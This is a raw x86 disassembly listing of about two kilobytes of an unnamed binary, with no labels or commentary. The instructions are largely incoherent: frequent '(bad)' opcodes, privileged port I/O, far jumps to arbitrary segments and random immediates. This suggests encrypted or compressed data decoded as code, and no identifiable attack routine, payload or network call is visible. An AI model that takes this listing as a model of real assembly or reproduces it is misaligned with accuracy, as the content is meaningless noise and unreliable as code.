  4173d5:	add    BYTE PTR [ecx-0x44],ch
  4173d8:	xlat   BYTE PTR ds:[ebx]
  4173d9:	pop    esi
  4173da:	xlat   BYTE PTR ds:[ebx]
  4173db:	jg     0x4173c6
  4173dd:	mov    edi,0x6508016b
  4173e2:	dec    esi
  4173e3:	rcl    DWORD PTR [eax+0x3f],1
  4173e6:	addr16 cli 
  4173e8:	add    BYTE PTR [eax],al
  4173ea:	add    BYTE PTR [ecx],al
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	jmp    0x5bf5:0x7c619643
  4173f5:	(bad)  
  4173f6:	aad    0x3a
  4173f8:	jmp    0x4173b0
  4173fa:	out    dx,al
  4173fb:	jo     0x417406
  4173fd:	dec    edi
  4173fe:	sar    DWORD PTR [esi+0x4d],0xad
  417402:	push   ss
  417403:	inc    esp
  417404:	cld    
  417405:	dec    eax
  417406:	(bad)  
  417407:	popa   
  417408:	out    0x8d,eax
  41740a:	dec    ebx
  41740b:	adc    ah,dh
  41740d:	je     0x417486
  41740f:	add    DWORD PTR [edi+eiz*4+0x40],ebp
  417413:	jecxz  0x4173d3
  417415:	div    DWORD PTR [ecx]
  417417:	mov    eax,ds:0xf2278bae
  41741c:	js     0x41748a
  41741e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41741f:	les    edi,FWORD PTR [ebx-0x25077e79]
  417425:	out    0xe1,al
  417427:	jg     0x4173b6
  417429:	adc    al,0x90
  41742b:	lahf   
  41742c:	fiadd  WORD PTR [edi]
  41742e:	cli    
  41742f:	jle    0x41744b
  417431:	jae    0x41742a
  417433:	mov    eax,0x450e4507
  417438:	jmp    0x4173e2
  41743a:	add    esp,edx
  41743c:	xchg   edi,eax
  41743d:	dec    BYTE PTR [edi]
  41743f:	les    eax,FWORD PTR [ebp+edi*2-0x28]
  417443:	sub    DWORD PTR [edx-0x5cbfc05f],0x28
  41744a:	inc    ecx
  41744b:	push   ecx
  41744c:	jle    0x4173e0
  41744e:	dec    edx
  41744f:	(bad)  
  417450:	xor    al,0xfd
  417452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417453:	stc    
  417454:	jmp    0x828c480f
  417459:	les    eax,FWORD PTR [edx]
  41745b:	sub    DWORD PTR [edi+0x72],ebx
  41745e:	jae    0x417489
  417460:	outs   dx,BYTE PTR ds:[esi]
  417461:	mov    al,ds:0xc2eebcd1
  417466:	sbb    eax,0x78c6bfd3
  41746b:	mov    ebx,0x230ee360
  417470:	or     BYTE PTR [edi-0x43ef9d88],cl
  417476:	and    BYTE PTR [eax+0x68],ah
  417479:	inc    esi
  41747a:	mov    ah,0xbb
  41747c:	xor    cl,ah
  41747e:	add    eax,0xd0ce17d3
  417483:	jg     0x4174e9
  417485:	popa   
  417486:	into   
  417487:	(bad)  
  417488:	cmp    al,0x6e
  41748a:	jno    0x41749c
  41748c:	shl    BYTE PTR [ebx+0x1161f1d3],1
  417492:	and    DWORD PTR [ebx+0x511eedfd],ebx
  417498:	fadd   QWORD PTR [bp+0x4a]
  41749c:	xor    bh,BYTE PTR [ebx+0x62ed7522]
  4174a2:	shl    BYTE PTR [edx],1
  4174a4:	out    dx,al
  4174a5:	mov    esp,0xe9e56419
  4174aa:	in     al,dx
  4174ab:	mov    ch,BYTE PTR [eax-0x2b]
  4174ae:	pop    esi
  4174af:	xchg   edi,eax
  4174b0:	(bad)  
  4174b1:	aam    0xfb
  4174b3:	in     eax,dx
  4174b4:	retf   
  4174b5:	pop    edi
  4174b6:	dec    esi
  4174b7:	pusha  
  4174b8:	and    ebx,DWORD PTR [ecx+0x31c5ca03]
  4174be:	cmp    eax,DWORD PTR [eax]
  4174c0:	push   edi
  4174c1:	addr16 mov dl,0xb6
  4174c4:	test   dh,0x4
  4174c7:	ret    0x670e
  4174ca:	xor    eax,DWORD PTR [eax]
  4174cc:	push   ds
  4174cd:	xor    bh,BYTE PTR [ebp-0x37]
  4174d0:	in     eax,0x49
  4174d2:	sub    ch,ch
  4174d4:	mov    bh,0xd5
  4174d6:	xor    bh,BYTE PTR [ebx-0x23]
  4174d9:	xchg   ecx,eax
  4174da:	imul   ebp,ebp,0xffffffe8
  4174dd:	sbb    eax,0x847408d9
  4174e2:	cmc    
  4174e3:	pop    es
  4174e4:	mov    bh,BYTE PTR [edi-0x40]
  4174e7:	jmp    FWORD PTR [esi+ebp*2]
  4174ea:	daa    
  4174eb:	loope  0x417561
  4174ed:	mov    dh,0x0
	...
  417553:	add    BYTE PTR [eax],al
  417555:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41755b:	fdivr  st(7),st
  41755d:	mov    edi,0x212a686b
  417562:	cld    
  417563:	jl     0x417511
  417565:	iret   
  417566:	addr16 sti 
  417568:	add    BYTE PTR [eax],al
  41756a:	add    BYTE PTR [ecx],al
  41756c:	add    BYTE PTR [eax],al
  41756e:	arpl   ax,ax
  417570:	push   esp
  417571:	mov    bl,0x3f
  417573:	sti    
  417574:	xchg   edx,eax
  417575:	sbb    edx,ebx
  417577:	or     al,0x3b
  417579:	and    eax,0xd56526d8
  41757e:	dec    ecx
  41757f:	dec    esi
  417580:	mov    bl,0x8
  417582:	or     eax,esi
  417584:	stc    
  417585:	and    al,0x76
  417587:	mov    esp,0x9859cbc3
  41758c:	and    edi,ecx
  41758e:	mov    ebp,0xde4ba897
  417593:	mov    ecx,0x12e443dc
  417598:	ficomp WORD PTR [ebx+0x3d]
  41759b:	aaa    
  41759c:	jno    0x4175cb
  41759e:	push   ebx
  41759f:	mov    BYTE PTR [edi-0x9],0xe1
  4175a3:	std    
  4175a4:	or     BYTE PTR [edx+0x24],ch
  4175a7:	lods   eax,DWORD PTR ds:[esi]
  4175a8:	int    0xe1
  4175aa:	jne    0x4175bb
  4175ac:	mov    ebx,0x5fc5ab49
  4175b1:	mov    esp,0xafd762e5
  4175b6:	(bad)  
  4175b8:	iret   
  4175b9:	mov    fs,ebp
  4175bb:	js     0x4175ba
  4175bd:	mul    bl
  4175bf:	xchg   DWORD PTR [edi],esi
  4175c1:	pop    eax
  4175c2:	aaa    
  4175c3:	iret   
  4175c4:	mov    DWORD PTR [esi-0x55098b45],edi
  4175ca:	inc    BYTE PTR [ebx]
  4175cc:	imul   DWORD PTR [eax+eiz*8+0x3c]
  4175d0:	ds or  ebp,DWORD PTR gs:[esi+0x2d2286f5]
  4175d8:	xchg   esp,eax
  4175d9:	ror    DWORD PTR [edx+0x4f],1
  4175dc:	push   ss
  4175dd:	push   es
  4175de:	cli    
  4175df:	scas   al,BYTE PTR es:[edi]
  4175e0:	mov    DWORD PTR [ebp*4-0x1b00e6c1],ebx
  4175e7:	out    0xb1,eax
  4175e9:	inc    dx
  4175eb:	loope  0x41764a
  4175ed:	mov    ebx,0xa26aecfb
  4175f2:	(bad)
  4175f6:	ss sbb dh,dl
  4175f9:	dec    ecx
  4175fa:	out    0x73,eax
  4175fc:	ror    dl,cl
  4175fe:	stos   BYTE PTR es:[edi],al
  4175ff:	pop    es
  417600:	jnp    0x4175a5
  417602:	mov    ebp,0x6b93c956
  417607:	xor    al,0x46
  417609:	sbb    BYTE PTR [esi-0xe],bh
  41760c:	enter  0xb367,0x2c
  417610:	test   ch,bh
  417612:	push   edx
  417613:	and    edi,DWORD PTR [esi]
  417615:	imul   ebp,DWORD PTR [ebp-0x2a],0x5a
  417619:	stos   DWORD PTR es:[edi],eax
  41761a:	cmovbe edi,DWORD PTR [esi]
  41761d:	(bad)  
  41761e:	pop    ds
  41761f:	retf   
  417620:	or     DWORD PTR [ecx],ebp
  417622:	in     eax,dx
  417623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417624:	mov    ds:0x897fa2b8,eax
  417629:	jge    0x417607
  41762b:	ret    0x1df2
  41762e:	std    
  41762f:	fstp   QWORD PTR [ecx]
  417631:	sub    ah,BYTE PTR [esi+0x79]
  417634:	xor    edi,esi
  417636:	bound  edi,QWORD PTR [eax+0x517d2503]
  41763c:	stc    
  41763d:	cld    
  41763e:	jb     0x41768c
  417640:	sar    BYTE PTR [edi-0x6423e53a],1
  417646:	pop    eax
  417647:	jns    0x417660
  417649:	pop    ebp
  41764a:	push   0x60
  41764c:	cdq    
  41764d:	mov    ch,0x7a
  41764f:	xor    al,BYTE PTR [ebp+0x4bcf9501]
  417655:	adc    dl,BYTE PTR [ecx+0x3]
  417658:	fst    QWORD PTR ds:0xba690f60
  41765e:	lods   al,BYTE PTR ds:[esi]
  41765f:	popf   
  417660:	mov    dl,0x49
  417662:	pop    ds
  417663:	test   DWORD PTR [edi],edx
  417665:	retf   0xe604
  417668:	or     ebx,edx
  41766a:	icebp  
  41766b:	fwait
  41766c:	test   ah,0x0
	...
  4176d3:	add    BYTE PTR [eax],al
  4176d5:	add    BYTE PTR [ecx-0x20b02c99],ch
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	fimul  DWORD PTR [ecx+0x6731dab2]
  4176e7:	cld    
  4176e8:	add    BYTE PTR [eax],al
  4176ea:	add    BYTE PTR [ecx],al
  4176ec:	add    BYTE PTR [eax],al
  4176ee:	inc    ecx
  4176ef:	mov    BYTE PTR [edx-0x47],al
  4176f2:	xor    eax,DWORD PTR [eax+0x29a70fdc]
  4176f8:	std    
  4176f9:	dec    eax
  4176fa:	stos   BYTE PTR es:[edi],al
  4176fb:	pop    edx
  4176fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176fd:	mov    esp,edx
  4176ff:	gs mov dh,0xc6
  417702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417703:	sbb    eax,DWORD PTR [edx]
  417705:	cmp    BYTE PTR [eax-0x68],dl
  417708:	out    dx,al
  417709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41770a:	cmp    DWORD PTR [ebx-0x4761d3c3],edi
  417710:	mov    al,ds:0xc41c44c2
  417715:	std    
  417716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417717:	push   ss
  417718:	adc    eax,edi
  41771a:	popf   
  41771b:	cli    
  41771c:	fimul  DWORD PTR [ebp+0x37]
  41771f:	xchg   DWORD PTR [edx+0x56],ebp
  417722:	add    BYTE PTR [edx-0x2c],0x42
  417726:	outs   dx,BYTE PTR ds:[esi]
  417727:	jae    0x4176d6
  417729:	mov    eax,0x9e0494ba
  41772e:	or     DWORD PTR [edx],esi
  417730:	mov    ah,BYTE PTR [esi-0x67f44609]
  417736:	and    dh,BYTE PTR [edx]
  417738:	mov    WORD PTR [ebx],gs
  41773a:	jae    0x41773e
  41773c:	mov    ebx,0x547e1a0f
  417741:	stos   BYTE PTR es:[edi],al
  417742:	or     esi,DWORD PTR [ecx]
  417744:	push   esi
  417745:	mov    dh,0xa7
  417747:	jge    0x41771e
  417749:	ret    
  41774a:	pusha  
  41774b:	xlat   BYTE PTR ds:[ebx]
  41774c:	jno    0x41779a
  41774e:	or     al,0xa4
  417750:	push   ss
  417751:	mov    bh,0xee
  417753:	and    dl,BYTE PTR [esi-0x70]
  417756:	sbb    al,0x36
  417758:	xchg   edi,eax
  417759:	sahf   
  41775a:	cmc    
  41775b:	jbe    0x41779c
  41775d:	(bad)  
  41775e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41775f:	pop    ss
  417760:	loope  0x417707
  417762:	and    al,ah
  417764:	jecxz  0x417719
  417766:	push   eax
  417767:	scas   eax,DWORD PTR es:[edi]
  417768:	out    dx,eax
  417769:	int    0x61
  41776b:	sbb    eax,0x7f8d1f8
  417770:	test   eax,0x7e29b50c
  417775:	fldcw  WORD PTR [ecx+0x7e]
  417778:	sbb    bl,BYTE PTR [edi+0x74]
  41777b:	pop    esp
  41777c:	sub    BYTE PTR [ebp+0x44501345],0xfd
  417783:	dec    ebx
  417784:	fucomp st(3)
  417786:	mov    es,WORD PTR [edx]
  417788:	jmp    0x5522:0x1ba0427c
  41778f:	push   eax
  417790:	inc    ecx
  417791:	cmc    
  417792:	in     al,dx
  417793:	jbe    0x4177a9
  417795:	mov    dl,0x89
  417797:	(bad)  
  417798:	out    0xbb,eax
  41779a:	dec    esp
  41779b:	leave  
  41779c:	xor    DWORD PTR cs:[edx-0x2fc785d0],esi
  4177a3:	or     eax,0xb5256137
  4177a8:	es daa 
  4177aa:	and    BYTE PTR [ebx-0x19],ch
  4177ad:	inc    edi
  4177ae:	jle    0x41776d
  4177b0:	shl    DWORD PTR [edx-0x499384e2],1
  4177b6:	lock in eax,dx
  4177b8:	push   ecx
  4177b9:	(bad)  
  4177ba:	loopne 0x41776f
  4177bc:	lds    esi,FWORD PTR [ebp+0x5225cff7]
  4177c2:	jb     0x4177e2
  4177c4:	repz pop ss
  4177c6:	and    cl,BYTE PTR [edx+0x24b34524]
  4177cc:	repnz daa 
  4177ce:	sub    eax,0xd375cc6b
  4177d3:	es std 
  4177d5:	test   BYTE PTR [ecx-0x6e],bh
  4177d8:	jns    0x4177fc
  4177da:	sub    ch,bh
  4177dc:	adc    al,dh
  4177de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177e0:	adc    eax,0x7d18e467
  4177e5:	jb     0x4177f4
  4177e7:	adc    DWORD PTR [edi+0xb],esi
  4177ea:	nop
  4177eb:	fcom   QWORD PTR [edx-0x10]
	...
  417856:	jmp    0xff597669
  41785b:	imul   ecx
  41785d:	(bad)  
  41785e:	lahf   
  41785f:	repnz and dl,dl
  417862:	xchg   edx,eax
  417863:	jno    0x417813
  417865:	je     0x4178ce
  417867:	std    
  417868:	add    BYTE PTR [eax],al
  41786a:	add    BYTE PTR [ecx],al
  41786c:	add    BYTE PTR [eax],al
  41786e:	ffreep st(5)
  417870:	inc    edi
  417871:	fidiv  WORD PTR [ebx]
  417873:	jo     0x4177f6
  417875:	sar    DWORD PTR [eax-0x75df3acf],0xc1
  41787c:	xchg   ecx,eax
  41787d:	arpl   WORD PTR [edx],bp
  41787f:	pop    eax
  417880:	fdivrp st(2),st
  417882:	inc    esi
  417883:	cmp    esp,0xfffffffb
  417886:	repz sub dl,BYTE PTR [ecx+0x426f8bdc]
  41788d:	adc    edx,DWORD PTR [ebx]
  41788f:	pop    esi
  417890:	mov    ds,WORD PTR [eax]
  417892:	dec    edx
  417893:	in     al,0x53
  417895:	lods   eax,DWORD PTR ds:[esi]
  417896:	xor    ah,BYTE PTR [ecx-0x2b897d1e]
  41789c:	jg     0x41790c
  41789e:	sbb    eax,0x5df63b16
  4178a3:	iret   
  4178a4:	ficom  DWORD PTR [edx]
  4178a6:	xchg   ecx,eax
  4178a7:	jge    0x417914
  4178a9:	and    al,0x6
  4178ab:	je     0x4178c2
  4178ad:	outs   dx,DWORD PTR ds:[esi]
  4178ae:	adc    ch,dl
  4178b0:	push   DWORD PTR [ebx-0x6]
  4178b3:	pop    edx
  4178b4:	das    
  4178b5:	mov    esp,?
  4178b7:	shr    DWORD PTR [ecx],1
  4178b9:	mov    ebx,DWORD PTR [ebx+0x67a269b9]
  4178bf:	lods   al,BYTE PTR ds:[esi]
  4178c0:	ins    DWORD PTR es:[edi],dx
  4178c1:	enter  0xccbe,0xdf
  4178c5:	and    esi,esi
  4178c7:	cmc    
  4178c8:	loopne 0x41788c
  4178ca:	scas   al,BYTE PTR es:[edi]
  4178cb:	(bad)  
  4178cc:	fistp  QWORD PTR ds:0x2aa392b0
  4178d2:	iret   
  4178d3:	and    al,0x36
  4178d5:	mov    edx,ebx
  4178d7:	xor    edi,DWORD PTR [ecx+0x2d]
  4178da:	jl     0x417874
  4178dc:	stc    
  4178dd:	aad    0x63
  4178df:	xchg   ecx,eax
  4178e0:	and    dh,BYTE PTR [edx+ebp*1]
  4178e3:	sub    dl,BYTE PTR [esi+0x488098c3]
  4178e9:	push   ebp
  4178ea:	retf   0x6fea
  4178ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178ee:	add    ah,BYTE PTR [edi+0x42]
  4178f1:	addr16 in eax,0x2b
  4178f4:	ins    BYTE PTR es:[edi],dx
  4178f5:	mov    eax,ds
  4178f7:	sbb    ebp,DWORD PTR [esi+0x1e]
  4178fa:	call   0xae0c:0x80666e2c
  417901:	add    al,0x91
  417903:	dec    esi
  417904:	or     edx,edi
  417906:	ins    DWORD PTR es:[edi],dx
  417907:	mov    ds:0x800a46b6,al
  41790c:	and    eax,0x36d1da67
  417911:	push   0x5f
  417913:	sbb    al,0x4e
  417915:	xchg   esp,eax
  417916:	cs xchg edx,eax
  417918:	ja     0x417964
  41791a:	sti    
  41791b:	inc    eax
  41791c:	adc    BYTE PTR [ecx+0x4b],bh
  41791f:	xchg   esp,eax
  417920:	add    al,0x4b
  417922:	mov    ecx,0x724e7780
  417927:	(bad)  
  417928:	loope  0x4178f0
  41792a:	stos   DWORD PTR es:[edi],eax
  41792b:	sbb    BYTE PTR [ebx-0x7a],cl
  41792e:	or     al,0xdf
  417930:	(bad)  ss:[ebx]
  417933:	fucom  st(4)
  417935:	in     eax,0x75
  417937:	adc    ecx,DWORD PTR [esi+0x235f8998]
  41793d:	jo     0x41798c
  41793f:	out    0x47,al
  417941:	xchg   ebp,eax
  417942:	xor    eax,0xcafa9233
  417947:	xchg   esi,eax
  417948:	mov    WORD PTR [ebx+0x37],ss
  41794b:	cmc    
  41794c:	xlat   BYTE PTR ds:[ebx]
  41794d:	add    DWORD PTR [ebx+0x3ef0bbb],edi
  417953:	fsub   QWORD PTR [ecx+0x6b]
  417956:	dec    edx
  417957:	es mov ecx,0xbdf6539c
  41795d:	jns    0x417968
  41795f:	add    eax,0xfcd2cc03
  417964:	in     al,0x74
  417966:	xlat   BYTE PTR ds:[ebx]
  417967:	push   ecx
  417968:	clc    
  417969:	dec    esi
  41796a:	fimul  DWORD PTR [edi-0x68]
  41796d:	out    dx,eax
	...
  4179d6:	pop    eax
  4179d7:	inc    ecx
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179e3:	xchg   ecx,eax
  4179e4:	cmp    ebx,DWORD PTR [eax+0xfe67]
  4179ea:	add    BYTE PTR [ecx],al
  4179ec:	add    BYTE PTR [eax],al
  4179ee:	dec    esp
  4179ef:	mov    ax,0xc09
  4179f3:	add    dl,BYTE PTR [edi+0x7fe2c289]
  4179f9:	add    eax,0x9b63ccd9
  4179fe:	and    BYTE PTR [eax],0xe4
  417a01:	cmc    
  417a02:	fwait
  417a03:	sbb    DWORD PTR [edi+0x1b516809],esp
  417a09:	inc    esp
  417a0a:	pop    eax
  417a0b:	push   ss
  417a0c:	pushf  
  417a0d:	cld    
  417a0e:	sub    DWORD PTR ds:0xe842dd52,0x379ac624
  417a18:	inc    esp
  417a19:	add    eax,0x57852d01
  417a1e:	push   eax
  417a1f:	and    eax,DWORD PTR [edi+0x3f]
  417a22:	fisub  WORD PTR [eax-0x2b0f528f]
  417a28:	jmp    0x4179cc
  417a2a:	add    DWORD PTR [eax-0x4d],ebx
  417a2d:	xor    BYTE PTR [edx+0x58463f78],dh
  417a33:	xor    al,0x58
  417a35:	cli    
  417a36:	cmp    al,0xcd
  417a38:	jne    0x4179c7
  417a3a:	arpl   ax,si
  417a3c:	jno    0x4179f5
  417a3e:	je     0x4179d2
  417a40:	sbb    BYTE PTR [esi],bh
  417a42:	mov    DWORD PTR [eax-0x58bcad92],0xdaf6160f
  417a4c:	push   ss
  417a4d:	inc    edx
  417a4e:	jmp    0x417aba
  417a50:	int    0xf8
  417a52:	pop    esi
  417a53:	(bad)  
  417a54:	rol    DWORD PTR [ecx+esi*2],cl
  417a57:	dec    eax
  417a58:	neg    ecx
  417a5a:	add    eax,0x3ef53f
  417a5f:	push   ebp
  417a60:	cwde   
  417a61:	add    DWORD PTR [ebx],ecx
  417a63:	adc    BYTE PTR [ecx-0x55],0x7f
  417a67:	cs jmp 0xbfdabaa3
  417a6d:	je     0x417a61
  417a6f:	inc    eax
  417a70:	cs ss je 0x417a2f
  417a74:	push   esi
  417a75:	jl     0x417a1b
  417a77:	pop    edi
  417a78:	inc    edx
  417a79:	pop    esp
  417a7a:	pop    eax
  417a7b:	push   cs
  417a7c:	jmp    0x417a44
  417a7e:	adc    bl,al
  417a80:	imul   ecx,eax,0xffffffc9
  417a83:	in     eax,0x97
  417a85:	out    0x5d,al
  417a87:	adc    BYTE PTR [esi],ch
  417a89:	add    ecx,eax
  417a8b:	dec    esp
  417a8c:	add    edx,DWORD PTR [ebx]
  417a8e:	jle    0x417a75
  417a90:	dec    ebx
  417a91:	sbb    al,al
  417a93:	das    
  417a94:	add    dl,BYTE PTR [ebx-0x44]
  417a97:	in     al,dx
  417a98:	scas   al,BYTE PTR es:[edi]
  417a99:	and    BYTE PTR [esp+edi*1+0x29],dh
  417a9d:	xchg   BYTE PTR [esi],al
  417a9f:	mov    ebx,0xc7ab99b1
  417aa4:	adc    DWORD PTR [ebp-0x78],0xffffffa5
  417aa8:	push   ss
  417aa9:	das    
  417aaa:	cmp    al,BYTE PTR [edi]
  417aac:	(bad)  
  417aad:	push   esi
  417aae:	xor    al,0xd
  417ab0:	add    DWORD PTR [esi+eiz*8-0x20],esp
  417ab4:	adc    ch,BYTE PTR [edi+0x5267e9e5]
  417aba:	retf   
  417abb:	ds or  al,0x33
  417abe:	jge    0x417a9a
  417ac0:	push   edi
  417ac1:	mov    cl,0xb1
  417ac3:	scas   al,BYTE PTR es:[edi]
  417ac4:	xchg   ecx,eax
  417ac5:	cmp    eax,0xb311d38b
  417aca:	hlt    
  417acb:	ret    0xe8c7
  417ace:	lds    edx,FWORD PTR [ebx+eax*8-0x4e07187b]
  417ad5:	div    DWORD PTR [edi-0x11]
  417ad8:	ja     0x417abb
  417ada:	jl     0x417a85
  417adc:	add    eax,0xdd555e81
  417ae1:	pop    eax
  417ae2:	bound  edi,QWORD PTR [ecx+0x3]
  417ae5:	inc    esi
  417ae6:	jno    0x417b35
  417ae8:	xor    esi,DWORD PTR [edi]
  417aea:	push   ebp
  417aeb:	sti    
  417aec:	mov    WORD PTR [eax],cs
	...
  417b56:	das    
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx+0x30cbc9b2]
  417b66:	inc    DWORD PTR [bx+si]
  417b69:	add    BYTE PTR [eax],al
  417b6b:	add    DWORD PTR [eax],eax
  417b6d:	add    BYTE PTR [ebx+0x52c96e11],dl
  417b73:	adc    cl,0x1f
  417b76:	repz mov bh,0x86
  417b79:	xlat   BYTE PTR ds:[ebx]
  417b7a:	add    bh,cl
  417b7c:	lock sbb al,0x35
  417b7f:	pop    es
  417b80:	xchg   ecx,eax
  417b81:	dec    eax
  417b82:	pop    ecx
  417b83:	sar    DWORD PTR [edx],0x62
  417b86:	xor    al,0x84
  417b88:	dec    edi
  417b89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b8a:	idiv   DWORD PTR [ecx-0x1f0ea4f8]
  417b90:	mov    WORD PTR [esi],fs
  417b92:	clc    
  417b93:	inc    esi
  417b94:	clc    
  417b95:	setle  BYTE PTR [ebx]
  417b98:	lock mov al,0xd9
  417b9b:	xchg   BYTE PTR [ebx],ch
  417b9d:	push   edi
  417b9e:	adc    al,0x63
  417ba0:	push   ss
  417ba1:	adc    al,0xe9
  417ba3:	inc    edi
  417ba4:	jo     0x417be2
  417ba6:	and    eax,0xd1013d1f
  417bab:	scas   al,BYTE PTR es:[edi]
  417bac:	dec    edi
  417bad:	xchg   ebp,eax
  417bae:	arpl   WORD PTR [edx-0x6451156f],sp
  417bb4:	mov    ss,WORD PTR [eax+0x7c7c3ea1]
  417bba:	rcl    BYTE PTR [eax+0x4d],0x62
  417bbe:	call   0x90f26d67
  417bc3:	shr    DWORD PTR [esi+esi*4],0xc4
  417bc7:	and    eax,0x20b4ba07
  417bcc:	in     eax,dx
  417bcd:	mov    fs,ebx
  417bcf:	stos   BYTE PTR es:[edi],al
  417bd0:	pushf  
  417bd1:	cwde   
  417bd2:	sub    al,0xe
  417bd4:	mov    dl,0x2e
  417bd6:	or     dl,BYTE PTR [ebx-0x3c]
  417bd9:	pop    esi
  417bda:	mov    cl,0xcb
  417bdc:	cmp    edx,edx
  417bde:	in     al,dx
  417bdf:	cmp    eax,0x5f2493c5
  417be4:	mul    BYTE PTR [eax+0x22]
  417be7:	je     0x417c26
  417be9:	fucomi st,st(1)
  417beb:	(bad)  [esi-0x5d]
  417bee:	adc    eax,0x1942216d
  417bf3:	jb     0x417b8d
  417bf5:	inc    ebx
  417bf6:	data16 aad 0xf
  417bf9:	sub    BYTE PTR [edi+esi*8-0x73a4046],0x3c
  417c01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c02:	pushf  
  417c03:	push   ebx
  417c04:	test   eax,0x771dd81c
  417c09:	stos   BYTE PTR es:[edi],al
  417c0a:	xchg   ecx,eax
  417c0b:	test   dh,bl
  417c0d:	push   ebx
  417c0e:	xor    esi,esi
  417c10:	ror    DWORD PTR [edi-0x7600090b],cl
  417c16:	or     ah,BYTE PTR [esi-0x7a]
  417c19:	outs   dx,DWORD PTR ds:[esi]
  417c1a:	icebp  
  417c1b:	mov    al,ds:0xe502b115
  417c20:	clc    
  417c21:	push   esi
  417c22:	lods   eax,DWORD PTR ds:[esi]
  417c23:	pop    ds
  417c24:	jmp    0x455f9bde
  417c29:	mov    ecx,0x46ccd457
  417c2e:	xor    ecx,esp
  417c30:	sub    esp,DWORD PTR [ebx]
  417c32:	cmp    ah,BYTE PTR gs:0x2ffc6b04
  417c39:	enter  0xe40d,0xd9
  417c3d:	clc    
  417c3e:	mov    cl,0xed
  417c40:	add    dh,BYTE PTR ds:0x32b537be
  417c46:	ins    DWORD PTR es:[edi],dx
  417c47:	ja     0x417c51
  417c49:	adc    dh,BYTE PTR [edx-0x40]
  417c4c:	rol    ebp,1
  417c4e:	push   ecx
  417c4f:	dec    esp
  417c50:	addr16 mov edi,ebp
  417c53:	mov    edx,eax
  417c55:	mov    ah,BYTE PTR [ecx+0xf]
  417c58:	sahf   
  417c59:	push   ecx
  417c5a:	cmp    DWORD PTR [ecx+eax*4],ebp
  417c5d:	adc    bl,BYTE PTR [eax]
  417c5f:	idiv   bl
  417c61:	scas   al,BYTE PTR es:[edi]
  417c62:	xlat   BYTE PTR ds:[ebx]
  417c63:	aas    
  417c64:	(bad)  
  417c65:	mov    ebx,0xed645d6d
  417c6a:	jg     0x417cb1
  417c6c:	loope  0x417cdf
	...
  417cd6:	mov    eax,eax
  417cd8:	nop
  417cd9:	test   cl,bl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0x47
  417ce3:	cmp    eax,0x67b516
  417ce8:	add    DWORD PTR [eax],eax
  417cea:	add    BYTE PTR [ecx],al
  417cec:	add    BYTE PTR [eax],al
  417cee:	add    esp,esp
  417cf0:	adc    eax,0x8f0fe958
  417cf5:	pop    es
  417cf6:	loop   0x417cdc
  417cf8:	sub    eax,0xc55922cd
  417cfd:	inc    ebp
  417cfe:	popf   
  417cff:	push   esi
  417d00:	lods   al,BYTE PTR ds:[esi]
  417d01:	and    ch,BYTE PTR [ecx-0x18]
  417d04:	dec    ebx
  417d05:	push   cs
  417d06:	cli    
  417d07:	aaa    
  417d08:	push   ecx
  417d09:	push   edi
  417d0a:	dec    ecx
  417d0b:	jno    0x417c96
  417d0d:	adc    DWORD PTR [eax-0x5d],ebp
  417d10:	mul    BYTE PTR [edx]
  417d12:	and    edx,edx
  417d14:	or     esp,esi
  417d16:	cli    
  417d17:	mov    WORD PTR [edx-0x3a],gs
  417d1a:	stc    
  417d1b:	jns    0x417ca7
  417d1d:	sbb    eax,0xeea3f882
  417d22:	or     cl,BYTE PTR [eax]
  417d24:	mov    gs,WORD PTR [ecx+edi*2+0x6c]
  417d28:	les    esp,FWORD PTR [esi-0x292ad41e]
  417d2e:	loope  0x417d4a
  417d30:	push   0x16c2dd98
  417d35:	cmp    bl,BYTE PTR [edi-0x5578d4c3]
  417d3b:	sbb    al,0x6b
  417d3d:	jg     0x417cc2
  417d3f:	xchg   edi,eax
  417d40:	bound  eax,QWORD PTR [ebp+0x794c6825]
  417d46:	sub    BYTE PTR [ecx],cl
  417d48:	or     DWORD PTR [edx],esi
  417d4a:	cmp    al,0xb3
  417d4c:	push   0x9af62a32
  417d51:	call   0x5571:0xf151c1c9
  417d58:	rcr    BYTE PTR [eax+0x35],0x94
  417d5c:	test   BYTE PTR [edx-0x37],cl
  417d5f:	push   ecx
  417d60:	lods   eax,DWORD PTR ds:[esi]
  417d61:	inc    esi
  417d62:	or     eax,DWORD PTR [esi]
  417d64:	push   ss
  417d65:	dec    ecx
  417d66:	mov    ecx,0x5dd67b47
  417d6b:	or     eax,0xe0b021a4
  417d70:	sub    al,0xb1
  417d72:	iret   
  417d73:	mov    dl,ah
  417d75:	cld    
  417d76:	pop    eax
  417d77:	dec    ebx
  417d78:	sahf   
  417d79:	pop    ds
  417d7a:	mov    eax,ds:0x941c1c73
  417d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d80:	mov    ecx,ss
  417d82:	fs add ebp,0xfffffff4
  417d86:	adc    cl,dl
  417d88:	xchg   edx,eax
  417d89:	iretw  
